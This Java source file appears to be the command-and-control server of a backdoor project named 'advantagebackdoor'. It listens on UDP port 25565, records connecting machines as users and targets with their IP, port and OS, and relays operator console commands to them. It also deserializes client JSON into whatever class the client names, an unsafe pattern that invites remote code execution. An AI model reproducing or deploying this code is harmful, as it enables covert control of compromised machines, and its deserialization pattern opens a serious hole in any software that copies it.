package me.faintcloudy.advantagebackdoor.server;

import com.alibaba.fastjson.JSON;
import org.apache.log4j.*;
import org.json.JSONObject;
import me.faintcloudy.advantagebackdoor.api.message.play.client.ClientNetworkMessage;
import me.faintcloudy.advantagebackdoor.server.command.CommandController;
import me.faintcloudy.advantagebackdoor.server.command.ServerCommand;
import me.faintcloudy.advantagebackdoor.server.message.NetworkMessageController;
import me.faintcloudy.advantagebackdoor.api.connection.UserConnection;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.stream.Collectors;

public class Log4jServer {
    private static Log4jServer instance = null;

    public static void setInstance(Log4jServer instance) {
        Log4jServer.instance = instance;
    }

    public static Log4jServer getInstance() {
        return instance;
    }

    public static void main(String[] args) {
        Log4jServer server = new Log4jServer();
        setInstance(server);
        server.load();
    }

    File usersData = new File("users.yml");
    File targetsData = new File("targets.yml");
    public void saveTargets()
    {
        if (!targetsData.exists())
        {
            try {
                targetsData.createNewFile();
            } catch (IOException e) {
                Log4jServer.getInstance().getLogger().error("Error in creating targets data file: " + e.getMessage());
                e.printStackTrace();
            }
            return;
        }
        try {
            FileWriter writer = new FileWriter(targetsData);
            for (UserConnection user : targets) {
                writer.write(user.getAddress().toString() + ":" + user.getPort() + ":" + user.getOS() + "\n");
            }
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public void loadTargets()
    {
        if (!targetsData.exists())
        {
            try {
                targetsData.createNewFile();
            } catch (IOException e) {
                Log4jServer.getInstance().getLogger().error("Error in creating targets data file: " + e.getMessage());
                e.printStackTrace();
            }
            return;
        }
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(targetsData)));
            List<String> lines = reader.lines().collect(Collectors.toList());
            for (String line : lines) {
                String[] split = line.split(":");
                InetAddress ip = InetAddress.getByName(split[0].substring(1));
                int port = Integer.parseInt(split[1]);
                String os = split[2];
                UserConnection user = null;
                for (UserConnection u : users) {
                    if (u.getAddress().toString().equals(ip.toString()) && u.getPort() == port)
                        user = u;
                }
                if (user == null)
                {
                    user = new UserConnection(ip, port, users.size() + 1);
                    user.setOS(os);
                    users.add(user);
                }
                targets.add(user);
            }
        } catch (FileNotFoundException | UnknownHostException e) {
            e.printStackTrace();
        }
    }
    public void saveUsers()
    {
        if (!usersData.exists())
        {
            try {
                usersData.createNewFile();
            } catch (IOException e) {
                Log4jServer.getInstance().getLogger().error("Error in creating users data file: " + e.getMessage());
                e.printStackTrace();
            }
            return;
        }
        try {
            FileWriter writer = new FileWriter(usersData);
            for (UserConnection user : users) {
                writer.write(user.getAddress() + ":" + user.getPort() + ":" + user.getOS() + "\n");
            }
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public void loadUsers()
    {
        if (!usersData.exists())
        {
            try {
                usersData.createNewFile();
            } catch (IOException e) {
                Log4jServer.getInstance().getLogger().error("Error in creating users data file: " + e.getMessage());
                e.printStackTrace();
            }
            return;
        }
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(usersData)));
            List<String> lines = reader.lines().collect(Collectors.toList());
            for (String line : lines) {
                String[] split = line.split(":");
                InetAddress ip = InetAddress.getByName(split[0].substring(1));
                int port = Integer.parseInt(split[1]);
                String os = split[2];
                UserConnection user = new UserConnection(ip, port, users.size() + 1);
                user.setOS(os);
                users.add(user);
            }
        } catch (FileNotFoundException | UnknownHostException e) {
            e.printStackTrace();
        }
    }

    Logger logger;
    NetworkMessageController networkMessageController;
    CommandController commandController;
    DatagramSocket socket;
    Set<UserConnection> users = new HashSet<>();
    Set<UserConnection> targets = new HashSet<>();
    SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd-hh-mm-ss");
    public void loadLogger()
    {
        PropertyConfigurator.configure(new ByteArrayInputStream(("log4j.rootLogger=INFO,console\n" +
                "log4j.additivity.org.apache=true\n" +
                "#console\n" +
                "log4j.appender.console=org.apache.log4j.ConsoleAppender\n" +
                "log4j.appender.console.Threshold=INFO\n" +
                "log4j.appender.console.ImmediateFlush=true\n" +
                "log4j.appender.console.Target=System.out\n" +
                "log4j.appender.console.layout=org.apache.log4j.PatternLayout\n" +
                "log4j.appender.console.layout.ConversionPattern=%d{yyyy-MM-dd HH:mm:ss} [%p] %m%n\n")
                .getBytes(StandardCharsets.UTF_8)));
        logger = Logger.getLogger(Log4jServer.class);
        File folder = new File("logs");
        File file = new File(folder, format.format(new Date()) + ".log");
        try {
            if (!folder.exists())
                folder.mkdir();
            if (!file.exists())
                file.createNewFile();
            PatternLayout layout = new PatternLayout();
            layout.setConversionPattern("%d{yyyy-MM-dd HH:mm:ss} [%p] %m%n");
            logger.addAppender(new FileAppender(layout, folder + File.separator + file.getName(), false));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void load() {
        loadLogger();
        int port = 25565;
        try {
            socket = new DatagramSocket(port);
        } catch (IOException e) {
            Log4jServer.getInstance().getLogger().error("启用 Socket 服务时发生未知错误: ");
            e.printStackTrace();
            System.exit(0);
        }

        Log4jServer.getInstance().getLogger().info("成功启用 Socket 服务 (" + port + ")");

        this.loadUsers();
        this.loadTargets();
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            this.saveUsers();
            this.saveTargets();
        }));
        networkMessageController = new NetworkMessageController();
        commandController = new CommandController();
        Scanner scanner = new Scanner(System.in);
        new Thread(() -> {
            while (true) {
                byte[] bytes = new byte[60000];
                DatagramPacket packet = new DatagramPacket(bytes, bytes.length);
                try {
                    Log4jServer.getInstance().getSocket().receive(packet);
                } catch (IOException e) {
                    Log4jServer.getInstance().getLogger().error("在接受来自客户端 " + packet.getAddress() + ":" + packet.getPort() + "号的信息时发生错误: ");
                    e.printStackTrace();
                    continue;
                }
                bytes = packet.getData();
                ClientNetworkMessage message = deserialize(new String(bytes, 0, packet.getLength(), StandardCharsets.UTF_8));
                UserConnection user = null;
                for (UserConnection u : users) {
                    if (Objects.equals(packet.getAddress().toString(), u.getAddress().toString()) && packet.getPort() == u.getPort())
                        user = u;
                }
                if (user == null)
                {
                    user = new UserConnection(packet.getAddress(), packet.getPort(),users.size() + 1);
                    users.add(user);
                }
                message.setUser(user);

                Log4jServer.getInstance().getNetworkMessageController().call(message);

            }
        }).start();
        while (true)
        {
            String next = scanner.nextLine();
            logger.info("Console issued command: " + next);
            String[] split = next.split(" ");
            if (split.length < 1)
            {
                Log4jServer.getInstance().getLogger().info("无效指令, 输入 /? 以查看可用指令");
                continue;
            }
            if (commandController.isCommand(split[0]))
            {
                ServerCommand command = commandController.getCommand(split[0]);
                try {
                    command.execute(split);
                } catch (Exception e) {
                    Log4jServer.getInstance().getLogger().error("执行指令期间发生错误: ");
                    e.printStackTrace();
                }
            } else {
                Log4jServer.getInstance().getLogger().info("无效指令, 输入 /? 以查看可用指令");
            }
        }
    }

    public Logger getLogger() {
        return logger;
    }

    public DatagramSocket getSocket() {
        return socket;
    }

    public NetworkMessageController getNetworkMessageController() {
        return networkMessageController;
    }

    public static ClientNetworkMessage deserialize(String text)
    {
        if (!text.contains("KeepAliveMessage")) {
            Log4jServer.getInstance().getLogger().info(text + " from client");
        }

        JSONObject jsonObject = new JSONObject(text);
        Class<? extends ClientNetworkMessage> clazz = ClientNetworkMessage.class;
        try {
            clazz = (Class<? extends ClientNetworkMessage>) Class.forName(jsonObject.getString("theClass"));
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }

        return JSON.parseObject(text, clazz);
    }

    public CommandController getCommandController() {
        return commandController;
    }

    public Set<UserConnection> getTargets() {
        return targets;
    }

    public Set<UserConnection> getUsers() {
        return users;
    }
}
